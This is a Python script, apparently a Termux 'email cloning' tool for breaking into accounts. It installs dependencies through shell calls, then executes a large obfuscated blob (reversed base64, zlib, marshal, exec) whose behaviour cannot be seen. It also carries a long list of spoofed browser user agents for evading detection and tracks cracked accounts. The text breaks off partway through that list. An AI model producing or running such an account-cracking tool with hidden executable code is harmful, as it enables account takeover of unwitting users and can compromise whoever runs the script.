#         Tool Coder HANIF Afridi */UTF-8
#         It'z Made for BD Email Cloneing 
import os,sys,time,json,random,re,string,platform,base64,uuid,zlib
from os import system as _HANIF_
_HANIF_("pkg install play-audio")
try:
    import bs4
except ModuleNotFoundError:
    _HANIF_('pip install bs4')
    import bs4
try:
    import gtts
except ModuleNotFoundError:
    _HANIF_('pip install gtts')
    import gtts
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import requests as ress
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    _HANIF_('pip install requests')
    import requests
try:
    import mechanize
except ModuleNotFoundError:
    _HANIF_('pip install mechanize')
    import mechanize

_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=sC0D+IA/o+Et7va/+/7V/w6n1f56Pd1fZ//ftZ/E7vf+916z/XOf+8z9rvL9fxfv1d//+zT1rf/+9o/8PF/sw//d65fJ/fP/Zm1p3Q1/dq//fd+V3/H7//kc+z15j/fbr///ksZ21m//tZ8/5ryTZdz/7GMz7RY1Ci6sct90IZ6NuVpBbZMrzqk7ClmGThs3sQ/PH59NSrbRG8Mm2kGcPMDsJ8YOsVsZa9YyPUJzhHAzMhLgJuDoIYBwnwvE/yjwBkxnDExgOF9cW91kBDBVML3KM3XkdyBhcMyFGIzYIWoEEEhQ+1+TS2JyJE0+f2bYfErLVCUHkUOLURTyA8tDCqe+zTbmXTI8rY82youbjslB+YpJq5KhNRu1bZCwADxvggB8QFxrf0AQHMelHRQpY3hO2aAQPd+K/2fX14GcrZ0uiJmFeXzOQVrODTeHKXwRDaudNLfo9a5LwHdIJGGjTwh1pzbeEXYLwliSKeuU8NagmEyKolP0HISvsn3GhJq2IJCuH+RZqjIytNDvEBpiy9Fm0eJEMmhFtfuEaydFMcDNeoaT12sDY4RC4Lr0BaIyTD2glMvE0KSVP+NdAt6zOG4VxXV4uaAd7j0SpNydXgvIRTKIk7OH9n3USwtL2DkykoaPJclzlaU+PhBGnPCnNctff08vOwMD2sNBti8YJNB/0uKmcdGrLLn5VxMvimWj8dZBqj8hYs/T+GBHrUwCOkUR1uZ1tiIvj56copx7V+J7/ciM7sIa6zAhmu0Mls0IPXYxtXiM1BZiaB9hnK7axsOwvuvkBSg1fNrQiOCtD7LLUCiuAUtMIj5UiKQfY2tYC/skSoooyBU9p8Sjq1Tblb9ybhqTWWc07SnjdsqRBwvSQTXxD7sBq/d0gBpxts3lsuDWplp6WxnfBl+mtbz3Zr9/4YauG8TYX0ljnmxYbbcjjtxv1kNzhVaSzdYdEX46WAYrsfNZOLHODtBSkJuqOonyAfP6kY8pgAnaHk91lOvNpOmunjV3HtgKJk91Jb/kbdQ1fdUnE8BoJOEakaE132RhFF14nI9JNkeIkVmVsPnY/gI285vAszfSvhY2A5ouxB0blnFx1CX7j+ocLL4T27zwtra6L8waWS+9llzzJ+7hme8mPufoYNPtBb8c7F85K72GvZ1ndMh+vsCJMtCzw8L+NIh4JKdzKrbLWvzyZ33tZ06eNHLavAcv7yGmsknJYhzwf+XnoTiW27ZERnKbY8q9jstV3sg9JIFCQfRaHF+Bb3YGGWZf9GfUlo8ESgGvuSrdyGPicw962q8veAzxRaVKE6wcpyxR1XmwpXJWlFO1msVp9BbrNTzxL1WJAu/LOC1kprr9Pmsu3AQlIBo9qJg+kQqVGFbelu65XCU7sv0YWxqXD2DYxXQj3l4W3kW9Fc6wUL0jz04erRdNOxrc2uMcbIH0l34nGNxjF6xAW6N4FM2v6aTE1PFcQgVpwJmlhnsOmaNwuhffjJjpc87iGKUxByMnjjZo6wdqdpsbO9etSf8RO4NRyXpiBJTDO2RCEMHPrUJpTVppqTicVRH+bxkOhjFzgLSAYu9ireeH9AhMLU8xNYQA04SMfgjAegrsMfKi/YhQe2BdgJL+J1Zsl96StQSzvVgzCWBv+XyA7bkzDXIaQIVH8kfQGYl/RB0BdPzbqKhJmZA75bggxgmo6AvgkmEpB19DGEeVpX8o6VYmBSqOth6/HagvNYFe7nGDC9JxK/ozXoWbKJCoQVjurNuhPxp9ym/qkTkwQvmQnvlc20otiFgEXKqgB/qvDMS7bISM4OQYCBM1OHXVVuAoJF61PbQ2Zdsf39CyxNIwohDjR8SZ3ZgjwpxO5d8S30Lc/PbyL3yc/sWVWRUQRWP4XXdOgrAJBmbVzkQBdQK0cI84B5eCGuQSsFKqzG4Trd+WST4yAsv5H5CohLiUHFSvf7nNAnlr04/Ppgd0yN/diOfKzGEIHm55Wcy1kRm7vW0purE4pXmdqo6qfIjRmfDk0UIM19FEm7YKxlpJ5sL6QuzCq/hSVunLiT+e4obQPZVu0ZLk8cV98fTo3O8nKJSwYBIstxOnGQIJNXVjrYJKahDCouvgjG9LV+E4jLYNSzB+kXkfuxlIY9dFd12JiHl7W16PwTTdfOpDhJTl2CB9e7cIsGUsA2gUTfcLFpLSVQOONrNFdm9FyBCtkfvDTvkSv/AoQM25plkU++Ke1XVVGTrIY10kEzKvz3CvWgI0EqatKMGH4XQVOlma9rypgl/3HPDmnQe3rgOBBNSY4Qcu8zPPxLtxelnasBaF1z3An7nWz8m+eDvoAOFWPZIfLZVAjnCPbOG5fjgq0pcHsOy5ZM1bGn4qaj98tLIAXMCTwX5hLhTubHuOHodpz6SIVLn9erO1da1WlQQfMpKAwxKg3oO4g947b0gapGvnaleKpWXpxwwPGLjM5g1mrHwdR1OEg702lebxsN45W4xGfpZF7iC2OMpJJn9XEzUyCi1BuVaNDxMSKFl8jWJvti/e4baRHN/XJDlsIoB4PGOgFB8IpNrPog63jjcF6Tcjc/pVNaPEWJioYf9VChX1IAP29VrfTKxRHeSAi7ilTUiVQ8+fHCLZ+G8+w2BqAEQDWQthbr7bIlVHFFO60J0Rv7umWkhSqRTIGGMqtoUzS7RlGCI0vyyEra6LtZ0FIPrk58z0Zc9orXcPQYBT1Mxq1R6qTzVZ+qMsWJ8ljvs1fL5/qK6Ru0syZ3x29Tf1elykKj3qWoyoehVvPoPri5QsNOWdrfwREKcHjA4m9+sP/Q42pZU6ub8Qa6470il+1tqpU9UaRvgkX517asThV3a49EhqwJJwy2Q/RhpCLILvjwu2RjQp3iETOwP1ai5/C3a39dVj13ndElWeAo5hWcffYE/gBknzLpKIpfVO3B2LCyAFsbsIHqAWC3bYZqIOtIVaJ7dneL8STH6xal2k5MMA3g0ZhvhFqXVhyQQbCXeNsKoYXidevxVY3NETnas5BpKdZwm1iN+hlCNA5bChrX15n5iBjLhwTXUZ+LEpdexO1tKoPiE8MmKuztBQIQWYvSZOa4MzmEl7RBN7cbl1wnCrixadDOYw4mMxqhR82LNdom+tbKjRAU8Csed6ZTNb4HBhbpQB+72sBPI6QhSY0JP2bGnH3A1HPncr8k1wVrtxjeS16aAqNtvKAQ3LvYockOMc23L4O0q+Z6EnP46Yy4IqaI+YuXZo0KP7HeFcvNClBy9im2Y3IupRaTH4kC5U1hO74D3xBuUtnt7+LoxiZJyguHelpgv7AY5kgebpF6oIIax15QJuSRfMEdjDXhdNPBHV1zamDeWnKTGaXNlgrQ+8LKE+9WbNGOVFQFVofO8r7Ak6Ua8bVW2Ar5SlEyXbi1q1W3IW8qNe4RwoEoYDfKSjZbjhlY54vEalzwZQUwQkEpxOOnqK1dCziWJIlIG2KZ+Ak1bEqUWGyB7bUP9QTNcQHbTe+eKrW5gXuD6vNwrnvK1beno9VDkbPdANXNt2sOXZNcTPcNoR6bVwyLOJXYwaQwDN1yCwSnP6/qUw0af73mOArCU1U5bjbp3p/A0NWPNArEKwTy7oeG189ThJDDkZ1XNe/Iidr3iA1IX5GfNDARars94H8M2Dp65U5VH8X3U8dt2oyxd1znrB5werECgNq+aBSiTHd7pxKH/9pvsdKZW1W5blEzcYwhEb1/lICqhdyYNFEIvhwA8NY0q+5lTyYDvtCfkOarmjD4shh8qj+wIlbgpsSqKVxCXS7yvVI0vxBLSni8a7MIK+CMuwkucCAmtaui8CtAfpgU6MKmmmiFf3i1Y20hAFf47XC+bsPhrY5q1IE6hblC1hCXXRi4JvFQH3zPhW7ic59WB7CU8S7oZBqipcoTKwVk7WAwU95pjcdD7D54U+ujRXYTUbfMNA8lMgwfEPdD4Uw/prc5Z5LYEkT9P8Fvo3+5eADrq4gObUpDjnp8jDxr5ECPI7AJ9ETnXjsTR7REVZquhzCG/pGbjnaTWZZPPEr+sLEq5Ex5epnx4GcnKIW0Vn9kFZUVbTOeCoBLlFjVJl1qmu0pQ1dxXdUUYBt79aFK3fpH3i15Agcubv4bsRm9EvK6euaG3VUN0myavs8PCufkQVzg4KmWFAE7sVjVKLO3T6qw+w91Xe2Mcjij9CjEWjGOyrP9byLDmXB5pBcJrGZx2yGq4A2I8YQjKP+yFIkj8JizNIWKZUJqWdtXoDozIegF6vuqvUV4nV48w3ekkxdgYsZ/C4hMPDEXp4M3iLi1gdy8bzyTczY6bKyoj18nWeT9kgHpSrq+i1noKyLK7bEVGSTjaT3xYyf+d2y5tSfOFDSMl4BYs1ZlhY3VGAS5GNVfK6SadBv4tMeoOqOJBZGlMGQP+xiPfX4y+hsKRtDFceWTaMqt9J9mmcu0gr/ZiZtUNQjXZEfsAdW+p4B5QFWcfLQWRGaRL9t687avv0f4Tah/m/i4Cc7u6mMcaSApXIYPXqtoJw2FTo8o2G77wrncKcWaTarOkM9SLdOW4FWP8ciToJOk9vqlAqXp7YoPmb4O+rabTfNFZ12jAcvXwsbI0Ifw9ugZp0WF9qTJc3pEqF5vDQYqPQvvF8iDupOdEck6idLhP3Bruy0G9NnSLX7dC0jApxZe90/wEgmlqJmaTXDAvuNxmN4211ykPHY/QEm1zhJ8f6gWwKKupMDH3O+Ofmd4nbeCaxfAb53ZdIc4swEjzgAp3t9tExib0vjC3xN7oC6HDV7PXkODIl0MmJnXLUcgj0hAxWf4Zl5JwXR39W4zVViU8C7l9OwEAwbGI971RZUhh628cOvew9MGXYFQbE4kLLTuzWm0qbRJdL/yPGGBvt/uSZdbhJv96J5hTwhhKftZFbxrOpljeL4sw3JBtG1skRWOf6dgt67Nz9piXr4B9GSmhmhUkR1XYGBZ5CA2EI4Hfbu5K4n3QhFSBIlPcFEXwVUv1TvHWsNVibLBezunocHrnQXvJ4NUc3FnzncceSN76MJQrEZvi75kXF4/TuST0Ok5Lbp+TRllrS14gyCjE586ZNRmLMl9iLJ90TKiFByIdfPdquAj0b7XMxpVb0XsDiJJy1sZPrAiPuzhlv1oYARzIg6ucRNVrHGkbJbdXzwInUyAi6NshDtkjkerpQRMiWQPpyaN9jJBh6FvT1n8JsEG1ulmC1WFY4kfqeUAMDvoPRENEBnGqOQzLskCOlw61i/EjorUBUrTqkelBg3nU9HnmTFtF19cRs/qM5Sudw/Lya/RGbWhVWW6o+tg7CPj4vtkSAd59eyKzMUnk201oVuHduSQBKtTyTt1OkK1iKpQuEAnQGA0lHdGeD72tLJ+9w1LAcTPULZcYyAxTB995k96ZJutuGo/3iVaU+t95cN+Gv4ob4ZZS3WqkTJ+LvCx2iB6x3Pkzm1wLiqoEPiJ6bWmd6nv33jBOWG3vTDA+CXmJds4GfJT9ANyhesM3MV0AxlyTOEzIIuC9+Q7rCv00hHX1+suE8MTsEUFKh74+gAeDdvGoE0sMyDr+QsAH1vfIwW/ij8GNXMEnUiYIHYAyhub4m58M6dcByY69lYpkFUQ+2YZ6Vj2uqC6XobJGrAiYOfFebIpwCOi79I2H0Y2P3AgvThtyT9xWoi4VHDQiW/g3buqfcGxZJWHMxRrTo2ZCO9Bw0hi5EcZ5sclySX/83NfTi5bHnOqlU3AWRVuddODP3M/zxmg2RGHh9CznX6oljdabgZWcriRGEc/xe/iZrNtcx/SueFvMf+SgIqX1vYT9elcCFmJbCyxZUB0wQZhnw0RBxqSEQH6VYFXosRYK3CkSUQhHzvkkbeEaVYzloDsYUN1BWvMK1AJnzhksgZy95WNUJ4QCQ8M0aONdHIaRJeZAa7j/Y3aLjusDSPqN0CwDHYJXBIQI0tJ3nD6DD4SUMoTc9ApwN/rTmKhRMq+fB2ivVJRKEsI8ASK5e7QKnjpGr7KoC6luniJAXwLxASwNBWEygWbDBSIJvhpOuEBJDyavclG8NpJABFAc1lIERIIgbpt+gLoD3quB9EprgPYvk7VmC4eAtoeT+LwCICYAU8RnA/ufKSMQlAIV48Ox7/zPnr/fs89i5r/y6/01r/m/X/p++/zzPft/+/nS/Dn/Jn/v/cX8Pdp+/f9fx3fd//pkh65tqW5WJXgKkyAFBodZ551iFxFSuBSgc7S9cdun5JJCPKDdJn8JkQIQORm5CEkrDEXF26v/aBU9KnFWtxJe'))
def logo():
    _HANIF_("clear")
    color_logo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\x1b[38;5;208m'])
    print(f"""
 __    __   ______   __    __  ______  ________ 
/  |  /  | /      \ /  \  /  |/      |/        |
$$ |  $$ |/$$$$$$  |$$  \ $$ |$$$$$$/ $$$$$$$$/ 
$$ |__$$ |$$ |__$$ |$$$  \$$ |  $$ |  $$ |__    
$$    $$ |$$    $$ |$$$$  $$ |  $$ |  $$    |   
$$$$$$$$ |$$$$$$$$ |$$ $$ $$ |  $$ |  $$$$$/    
$$ |  $$ |$$ |  $$ |$$ |$$$$ | _$$ |_ $$ |      
$$ |  $$ |$$ |  $$ |$$ | $$$ |/ $$   |$$ |      
$$/   $$/ $$/   $$/ $$/   $$/ $$$$$$/ $$/                 
\033[1;92m ┫\033[1;90m│\033[1;91m\033[47m𝘽\033[00m\033[1;90m│\033[1;92m┣\n\033[1;90m██   ██ ███████ ██   ██  ██████  {color_logo}██   ████   \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝙍\033[00m\033[1;90m│\033[1;92m┣\n\t\t\t\t\t      \033[1;90m│\033[1;91m\033[47m𝘼\033[00m\033[1;90m│\n\033[1;97m┌━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┐  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝙉\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘈𝘜𝘛𝘏𝘖𝘙        \033[1;35m:  \033[1;37m𝙃𝙀𝙍𝙊𝙉 𝘼𝙁𝙍𝙄𝘿𝙄      \x1b[38;5;208m│  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝘿\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;35m:  \033[1;37mHE4ON-AFRIDI      \x1b[38;5;208m│   \033[1;97m┗━┛\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗      \033[1;35m:  \033[1;37m01722183463       \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘗𝘖𝘞𝘌𝘙 𝐵𝑌      \033[1;35m:  \033[1;31m𝐴𝐿𝐸𝑋𝐴             \x1b[38;5;208m│\n\033[1;97m└━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┘\n\033[1;30m[\033[38;5;46m\033[37;1m\033[1;41m                  𝐀𝐋𝐄𝐗𝐀                  \033[00m\033[1;30m] """)
def create_audio(text,file):
    from gtts import gTTS
    my_a = gTTS(text)
    my_a.save(file)
###################
oks=[]
cps=[]
loop=0
_MAHI_=['Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.17 Safari/537.11','Mozilla/5.0 (Windows NT 6.0) yi; AppleWebKit/345667.12221 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/453667.1221','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/537.11','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36','Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/109.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0 (Edition Yx 05)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.3.949 Yowser/2.5 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0','Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.41','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.46','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.50','Mozilla/5.0 (Windows NT 10.0; rv:110.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536','Mozilla/5.0 (Windows Phone 10.0; Android 